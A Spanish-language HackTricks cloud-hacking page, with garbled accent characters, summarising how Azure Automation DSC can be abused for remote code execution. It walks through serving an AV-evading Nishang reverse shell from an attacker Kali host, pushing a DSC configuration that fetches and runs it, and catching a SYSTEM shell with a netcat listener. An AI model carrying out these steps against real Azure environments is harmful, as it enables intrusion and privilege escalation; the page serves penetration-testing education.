# Az - Estado de Configuraci√≥n RCE

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

**Consulta la publicaci√≥n completa en: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### Resumen de la Preparaci√≥n de la Infraestructura del Servidor Remoto (C2) y Pasos

#### Visi√≥n general
El proceso implica configurar una infraestructura de servidor remoto para alojar un payload modificado `Invoke-PowerShellTcp.ps1` de Nishang, llamado `RevPS.ps1`, dise√±ado para evadir Windows Defender. El payload se sirve desde una m√°quina Kali Linux con IP `40.84.7.74` utilizando un servidor HTTP Python simple. La operaci√≥n se ejecuta a trav√©s de varios pasos:

#### Paso 1 ‚Äî Crear Archivos
- **Archivos Requeridos:** Se necesitan dos scripts de PowerShell:
1. `reverse_shell_config.ps1`: Un archivo de Configuraci√≥n de Estado Deseado (DSC) que obtiene y ejecuta el payload. Se puede obtener en [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1).
2. `push_reverse_shell_config.ps1`: Un script para publicar la configuraci√≥n en la VM, disponible en [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1).
- **Personalizaci√≥n:** Las variables y par√°metros en estos archivos deben adaptarse al entorno espec√≠fico del usuario, incluidos nombres de recursos, rutas de archivos e identificadores de servidor/payload.

#### Paso 2 ‚Äî Comprimir Archivo de Configuraci√≥n
- El archivo `reverse_shell_config.ps1` se comprime en un archivo `.zip`, prepar√°ndolo para transferirlo a la Cuenta de Almacenamiento de Azure.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Paso 3 ‚Äî Establecer Contexto de Almacenamiento y Subir
- El archivo de configuraci√≥n comprimido se carga en un contenedor de almacenamiento de Azure predefinido, azure-pentest, utilizando el cmdlet Set-AzStorageBlobContent de Azure.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Paso 4 ‚Äî Preparar Kali Box
- El servidor Kali descarga el payload RevPS.ps1 desde un repositorio de GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- El script se edita para especificar la VM de Windows objetivo y el puerto para el shell inverso.

#### Paso 5 ‚Äî Publicar Archivo de Configuraci√≥n
- Se ejecuta el archivo de configuraci√≥n, lo que resulta en que el script de shell inverso se implemente en la ubicaci√≥n especificada en la VM de Windows.

#### Paso 6 ‚Äî Alojar Carga √ötil y Configurar Escucha
- Se inicia un SimpleHTTPServer de Python para alojar la carga √∫til, junto con un escuchador de Netcat para capturar las conexiones entrantes.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- La tarea programada ejecuta la carga √∫til, logrando privilegios a nivel de SISTEMA.

#### Conclusi√≥n

La ejecuci√≥n exitosa de este proceso abre numerosas posibilidades para acciones adicionales, como la extracci√≥n de credenciales o la expansi√≥n del ataque a m√∫ltiples VM. La gu√≠a fomenta el aprendizaje continuo y la creatividad en el √°mbito de la Configuraci√≥n de Estado de Azure Automation DSC.

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
